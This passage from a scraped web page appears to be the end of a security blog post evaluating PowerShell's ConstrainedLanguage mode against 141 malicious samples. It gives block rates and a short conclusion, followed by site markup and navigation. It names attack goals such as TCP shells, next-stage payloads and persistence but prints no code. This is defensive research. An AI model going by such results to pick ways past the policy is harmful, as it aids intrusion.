  - 100% (141/141) of the samples from executing properly.
    - ... as in reaching their intended goal of launching a TCP shell, loading its next-stage payload, creating usable persistence, etc.
  - 51% (72/141) of the samples that had attempted to create a non-whitelisted type.
  - 50% (71/141) of the samples that had attempted to invoke a method on non-whitelisted type.
  - 26.9% (38/141) of the samples that had attempted to convert a value into a non-whitelisted type.
  - 2.8% (4/141) of the samples that had attempted to set a property on a non-whitelisted type.
- `ConstrainedLanguage` failed to block ...
  - 0.7% (1/141) of the samples that had managed to create persistence entries.

&lt;br&gt;

## Conclusion

Since PowerShell is now [an integral part](https://support.microsoft.com/en-us/windows/powershell-is-replacing-command-prompt-fdb690cf-876c-d866-2124-21b6fb29a45f) of modern Windows OSs, sysadmins should not underestimate the risks that PowerShell can bring to the organization.

In the article, we went through the benefits and drawbacks of `ConstrainedLanguage` and how it performs in a hypothetical test. By enabling the engine feature, the risk of PowerShell-introduced exploitation is greatly lowered - if enrolled properly. Organizations should also consider whether or not the reduced availability of modules and or scripts is worth the tradeoff before enrolling this language policy.

&lt;br&gt;
"/><meta property="og:url" content="https://teamt5.org/tw/posts/a-deep-dive-into-powershell-s-constrained-language-mode"/><meta property="og:type" content="website"/><meta property="og:image" content="https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1612249236/pexels_brett_sayles_3803517_1c8f3c2bfa.jpg"/><meta name="next-head-count" content="7"/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-cf519ab7dd9a5a4fd835.js"></script><script src="/_next/static/chunks/webpack-e50c24efd369c1efbdb6.js" defer=""></script><script src="/_next/static/chunks/framework-d2ee10ca2f4d09d55866.js" defer=""></script><script src="/_next/static/chunks/main-a8d0f6a9979592fe7c0c.js" defer=""></script><script src="/_next/static/chunks/pages/_app-c4fc1fc4c79c4d8fe6ea.js" defer=""></script><script src="/_next/static/chunks/938-e92d2fa2f45971e6fc56.js" defer=""></script><script src="/_next/static/chunks/355-15d3d4def9e737543aae.js" defer=""></script><script src="/_next/static/chunks/40-c99810d551f4d9c6ca2d.js" defer=""></script><script src="/_next/static/chunks/625-71996cc7d9f6287d8f11.js" defer=""></script><script src="/_next/static/chunks/258-abfc1d233ee6f2e32b5d.js" defer=""></script><script src="/_next/static/chunks/502-5fb4c5ca4d423d22ef37.js" defer=""></script><script src="/_next/static/chunks/pages/%5Blang%5D/posts/%5Buid%5D-2ad5faee628e3c6ea341.js" defer=""></script><script src="/_next/static/yZH7uzr0jnSd-VRHt_pM1/_buildManifest.js" defer=""></script><script src="/_next/static/yZH7uzr0jnSd-VRHt_pM1/_ssgManifest.js" defer=""></script></head><body><div id="__next"><loading-mask></loading-mask><div style="background-color:#4c433f;height:100%;width:100%;z-index:100;position:absolute"></div><div class="invisible"><div class="css-5un68d"><div class="css-1tgzre3"><header class="css-d4eynq"><div class="css-9225oi"><a class="css-9obram" href="/tw/"><svg width="140px" height="140px" viewBox="0 0 140 140"><g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="header_logo_L"><g><rect id="Rectangle" fill="#d93751" x="0" y="0" width="140" height="140"></rect><g id="logo" fill="#FEFEFE"><g class="css-17sqj2s"><path d="M45.3878535,7.83374722 L46.5394028,6.64521453 C41.9643042,2.79068668 36.0560225,0.348420339 29.5325296,0.000255690073 L29.5325296,7.2512 C30.6363042,8.26884649 33.1205859,8.98776174 36.5806423,8.98776174 C40.4539944,8.98776174 44.2998535,8.10477869 45.3878535,7.83374722" id="Fill-1"></path><path d="M26.3422648,52.6615012 L26.3422648,50.0376949 C19.5488,43.5926005 14.657307,42.8932881 12.8558423,42.8932881 L12.4429972,42.9060726 L9.33764507,46.0156901 C13.9118423,49.8697918 19.8196732,52.3129104 26.3422648,52.6615012" id="Fill-3"></path><path d="M46.3986028,45.2400969 C44.2419831,44.4845327 42.1705465,44.1001453 40.2415324,44.1001453 C33.6680113,44.1001453 30.3197296,48.5244358 29.4516732,49.8791671 L29.5192789,52.6619274 C36.3294197,52.3018305 42.4819831,49.6703535 47.1359549,45.5239128 L46.3986028,45.2400969 Z" id="Fill-5"></path><path d="M49.3275493,43.2795506 C53.0927324,39.0500107 55.4575775,33.7099235 55.8113803,27.8367225 L51.4832676,27.8367225 C49.2689577,28.6758121 47.6410141,30.0633569 46.8347042,31.9256329 C45.2644507,35.5670857 46.9270986,40.3173811 47.7140282,42.1903109 L49.3275493,43.2795506 Z" id="Fill-7"></path><path d="M16.046062,8.13963777 C20.6599211,8.13963777 24.7414986,7.04869346 26.3424,6.55904697 L26.3424,0.000170460048 C19.8198085,0.348761259 13.9128789,2.79145375 9.33868169,6.6451293 L10.3369915,7.58777337 C11.9067944,7.90823826 13.9128789,8.13963777 16.046062,8.13963777" id="Fill-9"></path><path d="M7.70582535,9.29574044 L7.08385352,8.77370654 C3.00002254,13.0923119 0.411628169,18.6684862 0.0429521127,24.8255031 L6.49072676,24.8255031 C11.2276282,18.4588203 7.85230423,9.67075254 7.70582535,9.29574044" id="Fill-11"></path><path d="M6.34780845,27.8365947 L0.0429070423,27.8365947 C0.412935211,33.9927593 2.99952676,39.5689337 7.08290704,43.887539 L9.97417839,41.1563429 C9.97778028,35.5507642 7.37811831,29.8667738 6.34780845,27.8365947" id="Fill-13"></path><path d="M12.8634141,24.8256736 C17.1762028,22.6514557 17.0261183,19.1634169 16.7484845,17.766923 L11.7177239,13.1244436 C12.1882592,16.1957075 12.254062,20.6979835 9.9315831,24.8256736 L12.8634141,24.8256736 Z" id="Fill-15"></path><path d="M13.7971831,10.8505065 L18.6422535,15.4235235 C19.5337465,15.5837559 20.6100282,15.7333346 21.5934648,15.7333346 C24.3594366,15.7333346 25.8409014,14.5482111 26.4732394,13.8416542 L26.3614648,9.47404165 C24.1588732,10.0962208 20.3977465,10.934032 16.0962254,10.934032 C15.3210141,10.934032 14.5494085,10.9050538 13.7971831,10.8505065" id="Fill-17"></path><path d="M41.6613859,24.8256736 L46.3753014,24.8256736 C44.5544563,23.29963 43.3163718,21.5485792 42.6876394,19.6040562 C42.1972732,18.0890925 42.1125408,16.4739835 42.4289352,14.7830199 L38.9531042,18.0673588 C38.9760901,18.1474751 38.910738,18.3170828 38.8954141,18.4986228 C38.7061183,20.6562208 40.6468507,23.5020513 41.6613859,24.8256736" id="Fill-19"></path><path d="M12.7555606,38.5327923 L17.2071662,34.3309521 C17.0530254,29.6173056 12.7055324,27.9787584 12.2038986,27.8057414 L9.59612394,27.8296058 C10.5912789,29.9816639 12.2462648,34.0816542 12.7555606,38.5327923" id="Fill-21"></path><path d="M46.2172845,27.8365947 L41.9004394,27.8365947 C38.0352,29.5646334 37.6029746,33.2550935 37.5912563,34.6933501 L43.6635944,39.135539 C43.1272563,36.6919942 42.9226366,33.6339409 44.1070873,30.8844203 C44.5970028,29.7410596 45.306862,28.7195777 46.2172845,27.8365947" id="Fill-23"></path><path d="M45.5075606,18.7829927 C46.6532507,22.3566877 50.5685183,24.3502179 51.7376451,24.8765133 L55.8349972,24.8317676 C55.4672225,18.673046 52.8801803,13.0943148 48.7949972,8.77485714 L48.1847437,9.35186441 L47.9224338,9.72900726 C45.4688,13.0917579 44.6588845,16.1374528 45.5075606,18.7829927" id="Fill-25"></path><path d="M29.5945014,42.8879613 L29.5286986,43.335845 L29.5327549,45.4930169 C31.5735437,43.6614237 35.1305014,41.4130557 40.2919662,41.4130557 C40.7354592,41.4130557 41.1830085,41.4296755 41.6341634,41.462063 L35.2923042,36.8251235 C30.4585014,37.3369298 29.6251493,42.6582663 29.5945014,42.8879613" id="Fill-27"></path><path d="M32.1713127,16.1228785 C32.5417915,16.2319729 32.9505803,16.2869462 33.3864113,16.2869462 C35.2847775,16.2869462 37.2480451,15.2326508 37.8037634,14.9100552 L41.4918761,11.4147719 C39.7634254,11.6551206 38.1237634,11.7769995 36.5963268,11.7769995 C33.7145239,11.7769995 31.3456225,11.3367864 29.5328901,10.4627525 L29.5328901,13.4862877 C30.1192563,14.8448542 31.0143549,15.7840891 32.1713127,16.1228785" id="Fill-29"></path><path d="M26.3422648,41.5732881 C24.648969,37.2640581 20.8373634,36.7778208 19.2747718,36.7778208 L18.9241239,36.7884746 L15.3054197,40.3536465 C17.9402366,40.863322 21.7130817,42.350586 26.3422648,46.2306828 L26.3422648,41.5732881 Z" id="Fill-31"></path><polygon id="Fill-33" points="27.9386592 34.3720329 36.4574197 26.3310063 27.9386592 18.2899797 19.4198986 26.3310063"></polygon></g><g class="css-13e8tc8"><path d="M53.5407775,0.00379273608 L45.8256225,0.00379273608 C45.6034254,0.00379273608 45.4114254,0.0800736077 45.2505239,0.232209201 C45.0896225,0.384770944 45.0089465,0.570998547 45.0089465,0.79174431 C45.0089465,1.01206392 45.0896225,1.19871768 45.2505239,1.35085327 C45.4114254,1.50341501 45.6034254,1.57926973 45.8256225,1.57926973 L48.5582423,1.57926973 C48.647031,1.57926973 48.6916507,1.61634479 48.6916507,1.68964262 L48.6916507,9.87513414 C48.6916507,10.127415 48.7858479,10.3456039 48.9751437,10.5288484 C49.163538,10.7129453 49.3970028,10.8049937 49.6746366,10.8049937 L49.6913127,10.8049937 C49.9581296,10.8049937 50.1884394,10.7129453 50.3831437,10.5288484 C50.5769465,10.3456039 50.6742986,10.127415 50.6742986,9.87513414 L50.6742986,1.68964262 C50.6742986,1.61634479 50.7135099,1.57926973 50.791031,1.57926973 L53.5407775,1.57926973 C53.7737915,1.57926973 53.9707493,1.50341501 54.1321014,1.35085327 C54.2930028,1.19871768 54.3736789,1.01206392 54.3736789,0.79174431 C54.3736789,0.570998547 54.2930028,0.384770944 54.1321014,0.232209201 C53.9707493,0.0800736077 53.7737915,0.00379273608 53.5407775,0.00379273608" id="Fill-35"></path><path d="M62.5289014,4.67316223 C61.895662,4.16732203 61.0830423,3.84856174 60.1978592,3.84472639 C60.192,3.84472639 56.8455211,3.84387409 56.8455211,3.84387409 L56.8455211,1.5908184 L61.8821408,1.5908184 C62.3468169,1.5908184 62.7209014,1.2345569 62.7209014,0.795196126 C62.7209014,0.356261501 62.3445634,9.9475983e-14 61.880338,9.9475983e-14 C61.8695211,9.9475983e-14 55.1661972,0.000426150121 55.1661972,0.000426150121 L55.1612394,5.45642615 C55.1612394,5.45642615 60.2442817,5.45813075 60.2587042,5.45898305 C61.2232113,5.50628571 61.9997746,6.45745278 61.9997746,7.30719613 C61.9997746,8.13435351 61.2633239,9.14646005 60.3335211,9.22018402 C60.3033239,9.22487167 55.2189296,9.21890557 55.2009014,9.22061017 C54.7610141,9.24617918 54.3743099,9.59349153 54.3743099,10.0158063 C54.3743099,10.0294431 54.3734085,10.0362615 54.3743099,10.0498983 C54.4009014,10.4700823 54.8250141,10.8105763 55.2748169,10.8105763 C55.3248451,10.8105763 60.1807324,10.8050363 60.1807324,10.8050363 C61.0397746,10.8050363 61.8294085,10.5399709 62.456338,10.1023148 C63.308169,9.50783535 63.8580282,8.32569492 63.8580282,7.30719613 C63.8580282,6.31682324 63.340169,5.32133656 62.5289014,4.67316223" id="Fill-37"></path><path d="M19.8986366,1.07875642 C20.091538,1.07875642 20.2492845,0.929177724 20.2492845,0.747211622 C20.2492845,0.56481937 20.091538,0.415666828 19.8986366,0.415666828 L12.4863549,0.415666828 L12.4859042,0.415666828 C12.2930028,0.415666828 12.135707,0.56481937 12.135707,0.747211622 L12.135707,10.4732358 C12.135707,10.5188339 12.1451718,10.5623012 12.1632,10.6023593 C12.2168338,10.7208291 12.3412282,10.8047806 12.4859042,10.8047806 L19.8986366,10.8047806 C20.091538,10.8047806 20.2492845,10.6556281 20.2492845,10.4732358 C20.2492845,10.2908436 20.091538,10.1421172 19.8986366,10.1421172 L12.8365521,10.1421172 L12.8365521,5.53884358 L19.4682141,5.53884358 C19.6444394,5.53884358 19.7882141,5.40247554 19.7882141,5.236277 L19.7882141,5.17874673 C19.7882141,5.01212203 19.6444394,4.875754 19.4682141,4.875754 L12.8365521,4.875754 L12.8365521,1.07875642 L19.8986366,1.07875642 Z" id="Fill-39"></path><path d="M10.1354366,0.415794673 L0.350647887,0.415794673 C0.157746479,0.415794673 -1.04805054e-13,0.564947215 -1.04805054e-13,0.746913317 C-1.04805054e-13,0.929305569 0.157746479,1.07888426 0.350647887,1.07888426 L4.89239437,1.07888426 L4.89239437,10.4733637 C4.89239437,10.6553298 5.05014085,10.8049085 5.24304225,10.8049085 C5.43594366,10.8049085 5.59369014,10.6553298 5.59369014,10.4733637 L5.59369014,1.07888426 L10.1354366,1.07888426 C10.328338,1.07888426 10.4860845,0.929305569 10.4860845,0.746913317 C10.4860845,0.564947215 10.328338,0.415794673 10.1354366,0.415794673" id="Fill-41"></path><path d="M24.5099718,6.72980533 L27.1776901,1.32025569 L29.8454085,6.72980533 L24.5099718,6.72980533 Z M27.5341972,0.47477385 C27.4692958,0.343093462 27.3232676,0.274909443 27.1776901,0.289824697 C27.0325634,0.274909443 26.8860845,0.343093462 26.8211831,0.47477385 L21.9643944,10.322677 C21.8828169,10.4875971 21.9589859,10.6861831 22.1338592,10.7633162 C22.3087324,10.8404494 22.5183099,10.76843 22.5998873,10.6030838 L24.1827606,7.39289492 L30.172169,7.39289492 L31.755493,10.6030838 C31.8370704,10.76843 32.0466479,10.8404494 32.2215211,10.7633162 C32.3963944,10.6861831 32.4725634,10.4875971 32.3909859,10.322677 L27.5341972,0.47477385 Z" id="Fill-43"></path><path d="M42.8502085,0.161510896 L42.8466028,0.161510896 C42.7375324,0.161510896 42.6433352,0.21264891 42.5793352,0.288077482 C42.5599549,0.306828087 42.5383211,0.323447942 42.5234479,0.347738499 L38.6347718,6.71612591 L34.7726873,0.391205811 C34.7298704,0.254837772 34.6014197,0.152561743 34.4436732,0.152561743 L34.4400676,0.152561743 C34.2480676,0.152561743 34.0912225,0.300861985 34.0912225,0.482401937 L34.0912225,10.466247 C34.0912225,10.6473608 34.2480676,10.795661 34.4400676,10.795661 L34.4436732,10.795661 C34.6352225,10.795661 34.7925183,10.6473608 34.7925183,10.466247 L34.7925183,1.74934625 L38.3300958,7.54243099 C38.3350535,7.55138015 38.3440676,7.55649395 38.3503775,7.56416465 C38.3589408,7.576523 38.3706592,7.58632446 38.3810254,7.59740436 C38.4017577,7.61828571 38.4224901,7.63788862 38.4472789,7.65280387 C38.4526873,7.65578692 38.4553915,7.66132688 38.4608,7.66388378 C38.4720676,7.66984988 38.4842366,7.67027603 38.4959549,7.67538983 C38.520293,7.68476513 38.5437296,7.69414044 38.5698704,7.69882809 C38.5919549,7.70223729 38.6126873,7.70266344 38.6347718,7.70266344 C38.6568563,7.70266344 38.6780394,7.70223729 38.6996732,7.69882809 C38.7258141,7.69414044 38.7492507,7.68476513 38.7735887,7.67538983 C38.7848563,7.67027603 38.7974761,7.66984988 38.8087437,7.66388378 C38.8141521,7.66132688 38.817307,7.65578692 38.8222648,7.65280387 C38.8475042,7.63788862 38.8677859,7.61828571 38.8885183,7.59740436 C38.8988845,7.58632446 38.9106028,7.576523 38.9191662,7.56416465 C38.9254761,7.55649395 38.9344901,7.55138015 38.9394479,7.54243099 L42.4977577,1.71525424 L42.4977577,10.4751961 C42.4977577,10.6563099 42.6546028,10.8050363 42.8466028,10.8050363 L42.8502085,10.8050363 C43.0422085,10.8050363 43.1990535,10.6563099 43.1990535,10.4751961 L43.1990535,0.49135109 C43.1990535,0.310237288 43.0422085,0.161510896 42.8502085,0.161510896" id="Fill-45"></path></g></g></g></g></g></svg></a><nav class="css-l5nqew"><div class="css-1d9x1rz"><div class="css-1xglul2 light"><div class="css-kknodv"><svg height="24" width="24" viewBox="0 0 24 24"><rect x="2" y="6" width="20" height="2" rx="1"></rect><rect x="2" y="11" width="20" height="2" rx="1"></rect><rect x="2" y="16" width="20" height="2" rx="1"></rect></svg></div></div></div><div class="css-jvtqvi disable-pointer-events"><div class="css-1umzfw"><div class="css-oro646"><div class="
              css-1wdsbza
              
            "></div><div class="
                css-1e542ht
                
              "><div class="css-x716e4"><div class="collapse css-23jkpm"><style data-emotion="css pi1u99">.css-pi1u99{-webkit-text-decoration:none;text-decoration:none;}.css-pi1u99.light{color:#fff;}.css-pi1u99.dark{color:#4c433f;}</style><a class="light css-pi1u99"><span>解決方案</span></a><div class="drop-icon dropdown-action-icon light show"><svg width="12px" height="7px" viewBox="0 0 12 7"><g id="Symbols" stroke="none" stroke-width="1"><g id="icon/down" transform="translate(-2.000000, -6.000000)"><g id="color/sonar_red" transform="translate(2.000000, 6.000000)"><path d="M0.295367042,0.295011084 C0.689189766,-0.0983370279 1.32770256,-0.0983370279 1.72152528,0.295011084 L6,4.56832964 L10.2784747,0.295011084 C10.6722974,-0.0983370279 11.3108102,-0.0983370279 11.704633,0.295011084 C12.0984557,0.688359195 12.0984557,1.32610249 11.704633,1.7194506 L6.71307912,6.70498892 C6.3192564,7.09833703 5.6807436,7.09833703 5.28692088,6.70498892 L0.295367042,1.7194506 C-0.0984556808,1.32610249 -0.0984556808,0.688359195 0.295367042,0.295011084 Z" id="Mask"></path></g></g></g></svg></div><div class="close-icon dropdown-action-icon"><img src="/images/icons/close.svg" alt="close icon"/></div></div><div class="css-1uptx9b"><div class="css-h7wgr8"><style data-emotion="css pi1u99">.css-pi1u99{-webkit-text-decoration:none;text-decoration:none;}.css-pi1u99.light{color:#fff;}.css-pi1u99.dark{color:#4c433f;}</style><a class="light css-pi1u99" href="/tw/products/threatsonar"><div class="css-frvq03"><div class="dropdown-item-image product css-1xyp7ut"><img src="/images/icons/ThreatSonar.svg" alt="threat-sonar"/></div><div class="css-brgklg">ThreatSonar</div><div class="css-redxgc"><div style="display:flex;justify-content:center;align-items:center;transform:rotate(180deg)"><svg width="40px" height="40px" viewBox="0 0 40 40"><g fill="#4c433f" transform="translate(5.000000, 5.000000)"><path d="M30,15 C30,15.4807835 29.627203,15.8770378 29.1469257,15.9311926 L29.0343052,15.9374971 L3.20017573,15.9367054 L15.3022515,28.4199682 C15.6677828,28.797006 15.6492627,29.3903257 15.2608856,29.7451848 C14.9023837,30.0727471 14.3540519,30.0826245 13.9843141,29.7856554 L13.8958136,29.7050268 L0.262475843,15.6425293 C-0.058327965,15.311627 -0.0850616157,14.8108998 0.182274891,14.4516934 L0.262475843,14.3574707 L13.8958136,0.294973235 C14.261345,-0.0820645885 14.8725086,-0.100043974 15.2608856,0.254815155 C15.6193876,0.582377427 15.6627451,1.11312505 15.3797938,1.48939075 L15.3022515,1.58003182 L3.20210712,14.0617057 L29.0343052,14.0624975 C29.5676437,14.0624975 30,14.4822331 30,15 Z"></path></g></svg></div></div></div></a><style data-emotion="css pi1u99">.css-pi1u99{-webkit-text-decoration:none;text-decoration:none;}.css-pi1u99.light{color:#fff;}.css-pi1u99.dark{color:#4c433f;}</style><a class="light css-pi1u99" href="/tw/products/threatvision"><div class="css-frvq03"><div class="dropdown-item-image product css-4cvnva"><img src="/images/icons/ThreatVision.svg" alt="threat-vision"/></div><div class="css-brgklg">ThreatVision</div><div class="css-redxgc"><div style="display:flex;justify-content:center;align-items:center;transform:rotate(180deg)"><svg width="40px" height="40px" viewBox="0 0 40 40"><g fill="#4c433f" transform="translate(5.000000, 5.000000)"><path d="M30,15 C30,15.4807835 29.627203,15.8770378 29.1469257,15.9311926 L29.0343052,15.9374971 L3.20017573,15.9367054 L15.3022515,28.4199682 C15.6677828,28.797006 15.6492627,29.3903257 15.2608856,29.7451848 C14.9023837,30.0727471 14.3540519,30.0826245 13.9843141,29.7856554 L13.8958136,29.7050268 L0.262475843,15.6425293 C-0.058327965,15.311627 -0.0850616157,14.8108998 0.182274891,14.4516934 L0.262475843,14.3574707 L13.8958136,0.294973235 C14.261345,-0.0820645885 14.8725086,-0.100043974 15.2608856,0.254815155 C15.6193876,0.582377427 15.6627451,1.11312505 15.3797938,1.48939075 L15.3022515,1.58003182 L3.20210712,14.0617057 L29.0343052,14.0624975 C29.5676437,14.0624975 30,14.4822331 30,15 Z"></path></g></svg></div></div></div></a></div></div></div><div class="css-x716e4"><div class="collapse css-23jkpm"><style data-emotion="css pi1u99">.css-pi1u99{-webkit-text-decoration:none;text-decoration:none;}.css-pi1u99.light{color:#fff;}.css-pi1u99.dark{color:#4c433f;}</style><a class="light css-pi1u99"><span>關於 TeamT5</span></a><div class="drop-icon dropdown-action-icon light show"><svg width="12px" height="7px" viewBox="0 0 12 7"><g id="Symbols" stroke="none" stroke-width="1"><g id="icon/down" transform="translate(-2.000000, -6.000000)"><g id="color/sonar_red" transform="translate(2.000000, 6.000000)"><path d="M0.295367042,0.295011084 C0.689189766,-0.0983370279 1.32770256,-0.0983370279 1.72152528,0.295011084 L6,4.56832964 L10.2784747,0.295011084 C10.6722974,-0.0983370279 11.3108102,-0.0983370279 11.704633,0.295011084 C12.0984557,0.688359195 12.0984557,1.32610249 11.704633,1.7194506 L6.71307912,6.70498892 C6.3192564,7.09833703 5.6807436,7.09833703 5.28692088,6.70498892 L0.295367042,1.7194506 C-0.0984556808,1.32610249 -0.0984556808,0.688359195 0.295367042,0.295011084 Z" id="Mask"></path></g></g></g></svg></div><div class="close-icon dropdown-action-icon"><img src="/images/icons/close.svg" alt="close icon"/></div></div><div class="css-1uptx9b"><div class="css-h7wgr8"><style data-emotion="css pi1u99">.css-pi1u99{-webkit-text-decoration:none;text-decoration:none;}.css-pi1u99.light{color:#fff;}.css-pi1u99.dark{color:#4c433f;}</style><a class="light css-pi1u99" href="/tw/about-us"><div class="css-frvq03"><div class="dropdown-item-image css-150aek"><img src="https://res.cloudinary.com/dvgomg5gh/image/upload/q_90/w_200,c_scale/f_auto/v1597723059/about_cover_59b796ac5a.jpg" alt="about-us"/></div><div class="css-brgklg">TeamT5 團隊</div><div class="css-redxgc"><div style="display:flex;justify-content:center;align-items:center;transform:rotate(180deg)"><svg width="40px" height="40px" viewBox="0 0 40 40"><g fill="#4c433f" transform="translate(5.000000, 5.000000)"><path d="M30,15 C30,15.4807835 29.627203,15.8770378 29.1469257,15.9311926 L29.0343052,15.9374971 L3.20017573,15.9367054 L15.3022515,28.4199682 C15.6677828,28.797006 15.6492627,29.3903257 15.2608856,29.7451848 C14.9023837,30.0727471 14.3540519,30.0826245 13.9843141,29.7856554 L13.8958136,29.7050268 L0.262475843,15.6425293 C-0.058327965,15.311627 -0.0850616157,14.8108998 0.182274891,14.4516934 L0.262475843,14.3574707 L13.8958136,0.294973235 C14.261345,-0.0820645885 14.8725086,-0.100043974 15.2608856,0.254815155 C15.6193876,0.582377427 15.6627451,1.11312505 15.3797938,1.48939075 L15.3022515,1.58003182 L3.20210712,14.0617057 L29.0343052,14.0624975 C29.5676437,14.0624975 30,14.4822331 30,15 Z"></path></g></svg></div></div></div></a><style data-emotion="css pi1u99">.css-pi1u99{-webkit-text-decoration:none;text-decoration:none;}.css-pi1u99.light{color:#fff;}.css-pi1u99.dark{color:#4c433f;}</style><a class="light css-pi1u99" href="/tw/careers"><div class="css-frvq03"><div class="dropdown-item-image css-150aek"><img src="https://res.cloudinary.com/dvgomg5gh/image/upload/q_90/w_200,c_scale/f_auto/v1597723058/TeamT5_Careers_img_b6492dddfd.jpg" alt="careers"/></div><div class="css-brgklg">人才招募</div><div class="css-redxgc"><div style="display:flex;justify-content:center;align-items:center;transform:rotate(180deg)"><svg width="40px" height="40px" viewBox="0 0 40 40"><g fill="#4c433f" transform="translate(5.000000, 5.000000)"><path d="M30,15 C30,15.4807835 29.627203,15.8770378 29.1469257,15.9311926 L29.0343052,15.9374971 L3.20017573,15.9367054 L15.3022515,28.4199682 C15.6677828,28.797006 15.6492627,29.3903257 15.2608856,29.7451848 C14.9023837,30.0727471 14.3540519,30.0826245 13.9843141,29.7856554 L13.8958136,29.7050268 L0.262475843,15.6425293 C-0.058327965,15.311627 -0.0850616157,14.8108998 0.182274891,14.4516934 L0.262475843,14.3574707 L13.8958136,0.294973235 C14.261345,-0.0820645885 14.8725086,-0.100043974 15.2608856,0.254815155 C15.6193876,0.582377427 15.6627451,1.11312505 15.3797938,1.48939075 L15.3022515,1.58003182 L3.20210712,14.0617057 L29.0343052,14.0624975 C29.5676437,14.0624975 30,14.4822331 30,15 Z"></path></g></svg></div></div></div></a></div></div></div><div class="css-gf2gsr"><style data-emotion="css pi1u99">.css-pi1u99{-webkit-text-decoration:none;text-decoration:none;}.css-pi1u99.light{color:#fff;}.css-pi1u99.dark{color:#4c433f;}</style><a class="css-17d51iu collapse light css-pi1u99" href="/tw/news-and-events">最新消息</a></div><div class="css-gf2gsr"><style data-emotion="css pi1u99">.css-pi1u99{-webkit-text-decoration:none;text-decoration:none;}.css-pi1u99.light{color:#fff;}.css-pi1u99.dark{color:#4c433f;}</style><a class="css-17d51iu collapse light css-pi1u99" href="/tw/blog">部落格</a></div><div class="css-x716e4"><div class="collapse css-23jkpm"><style data-emotion="css pi1u99">.css-pi1u99{-webkit-text-decoration:none;text-decoration:none;}.css-pi1u99.light{color:#fff;}.css-pi1u99.dark{color:#4c433f;}</style><a class="light css-pi1u99"><span>聯絡我們</span></a><div class="drop-icon dropdown-action-icon light show"><svg width="12px" height="7px" viewBox="0 0 12 7"><g id="Symbols" stroke="none" stroke-width="1"><g id="icon/down" transform="translate(-2.000000, -6.000000)"><g id="color/sonar_red" transform="translate(2.000000, 6.000000)"><path d="M0.295367042,0.295011084 C0.689189766,-0.0983370279 1.32770256,-0.0983370279 1.72152528,0.295011084 L6,4.56832964 L10.2784747,0.295011084 C10.6722974,-0.0983370279 11.3108102,-0.0983370279 11.704633,0.295011084 C12.0984557,0.688359195 12.0984557,1.32610249 11.704633,1.7194506 L6.71307912,6.70498892 C6.3192564,7.09833703 5.6807436,7.09833703 5.28692088,6.70498892 L0.295367042,1.7194506 C-0.0984556808,1.32610249 -0.0984556808,0.688359195 0.295367042,0.295011084 Z" id="Mask"></path></g></g></g></svg></div><div class="close-icon dropdown-action-icon"><img src="/images/icons/close.svg" alt="close icon"/></div></div><div class="css-1uptx9b"><div class="css-h7wgr8"><style data-emotion="css pi1u99">.css-pi1u99{-webkit-text-decoration:none;text-decoration:none;}.css-pi1u99.light{color:#fff;}.css-pi1u99.dark{color:#4c433f;}</style><a class="light css-pi1u99" href="/tw/request-information"><div class="css-frvq03"><div class="dropdown-item-image css-150aek"><img src="https://res.cloudinary.com/dvgomg5gh/image/upload/q_90/w_200,c_scale/f_auto/v1597723058/info_9e3a7cbe05.jpg" alt="request-information"/></div><div class="css-brgklg">索取資訊</div><div class="css-redxgc"><div style="display:flex;justify-content:center;align-items:center;transform:rotate(180deg)"><svg width="40px" height="40px" viewBox="0 0 40 40"><g fill="#4c433f" transform="translate(5.000000, 5.000000)"><path d="M30,15 C30,15.4807835 29.627203,15.8770378 29.1469257,15.9311926 L29.0343052,15.9374971 L3.20017573,15.9367054 L15.3022515,28.4199682 C15.6677828,28.797006 15.6492627,29.3903257 15.2608856,29.7451848 C14.9023837,30.0727471 14.3540519,30.0826245 13.9843141,29.7856554 L13.8958136,29.7050268 L0.262475843,15.6425293 C-0.058327965,15.311627 -0.0850616157,14.8108998 0.182274891,14.4516934 L0.262475843,14.3574707 L13.8958136,0.294973235 C14.261345,-0.0820645885 14.8725086,-0.100043974 15.2608856,0.254815155 C15.6193876,0.582377427 15.6627451,1.11312505 15.3797938,1.48939075 L15.3022515,1.58003182 L3.20210712,14.0617057 L29.0343052,14.0624975 C29.5676437,14.0624975 30,14.4822331 30,15 Z"></path></g></svg></div></div></div></a><style data-emotion="css pi1u99">.css-pi1u99{-webkit-text-decoration:none;text-decoration:none;}.css-pi1u99.light{color:#fff;}.css-pi1u99.dark{color:#4c433f;}</style><a class="light css-pi1u99" href="/tw/become-a-partner"><div class="css-frvq03"><div class="dropdown-item-image css-150aek"><img src="https://res.cloudinary.com/dvgomg5gh/image/upload/q_90/w_200,c_scale/f_auto/v1602841516/partner_c95a01f8af.jpg" alt="partner"/></div><div class="css-brgklg">成為合作夥伴</div><div class="css-redxgc"><div style="display:flex;justify-content:center;align-items:center;transform:rotate(180deg)"><svg width="40px" height="40px" viewBox="0 0 40 40"><g fill="#4c433f" transform="translate(5.000000, 5.000000)"><path d="M30,15 C30,15.4807835 29.627203,15.8770378 29.1469257,15.9311926 L29.0343052,15.9374971 L3.20017573,15.9367054 L15.3022515,28.4199682 C15.6677828,28.797006 15.6492627,29.3903257 15.2608856,29.7451848 C14.9023837,30.0727471 14.3540519,30.0826245 13.9843141,29.7856554 L13.8958136,29.7050268 L0.262475843,15.6425293 C-0.058327965,15.311627 -0.0850616157,14.8108998 0.182274891,14.4516934 L0.262475843,14.3574707 L13.8958136,0.294973235 C14.261345,-0.0820645885 14.8725086,-0.100043974 15.2608856,0.254815155 C15.6193876,0.582377427 15.6627451,1.11312505 15.3797938,1.48939075 L15.3022515,1.58003182 L3.20210712,14.0617057 L29.0343052,14.0624975 C29.5676437,14.0624975 30,14.4822331 30,15 Z"></path></g></svg></div></div></div></a></div></div></div><div class="css-1nae23b"><style data-emotion="css 11g9kr1">.css-11g9kr1{-webkit-text-decoration:none;text-decoration:none;}</style><a class="css-3n5iv4 css-11g9kr1" href="https://www.facebook.com/TeamT5.org/"><div class="css-6tkolk"><svg width="24px" height="24px" viewBox="0 0 24 24" version="1.1"><g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><path class="light" d="M22,0 C23.1045695,-2.02906125e-16 24,0.8954305 24,2 L24,22 C24,23.0543618 23.1841222,23.9181651 22.1492623,23.9945143 L22,24 L22,24 L14,24 L14,23.978 L13.875,24 L13.875,15.5633307 L16.6710937,15.5633307 L17.203125,12.0733717 L13.875,12.0733717 L13.875,9.80860051 C13.875,8.85381375 14.3398828,7.92315016 15.8305781,7.92315016 L15.8305781,7.92315016 L17.34375,7.92315016 L17.34375,4.95196885 